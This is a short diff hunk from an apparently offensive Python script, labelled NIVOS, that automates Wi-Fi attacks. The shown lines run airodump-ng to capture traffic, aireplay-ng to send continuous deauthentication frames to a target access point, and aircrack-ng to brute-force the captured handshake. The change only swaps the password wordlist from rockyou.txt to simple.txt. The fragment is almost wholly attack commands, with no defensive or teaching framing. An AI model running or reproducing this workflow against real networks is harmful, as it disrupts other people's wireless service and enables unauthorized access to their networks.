@@ -42,7 +42,7 @@ os.system("sudo airodump-ng -c "+c+" -w "+n+" --bssid "+mac+" "+iw+"mon")
 print(f"{bcolors.FAIL}[NIVOS] Attacking Acces Point...")
 os.system("sudo aireplay-ng -0 0 -a "+mac+" "+iw+"mon")
 print(f"{bcolors.FAIL}[NIVOS] Brute Forcing To Mac Adress...")
-os.system("sudo aircrack-ng -w "+"./wordlists/rockyou.txt"+" "+n+".cap")
+os.system("sudo aircrack-ng -w "+"./wordlists/simple.txt"+" "+n+".cap")
 
 
 
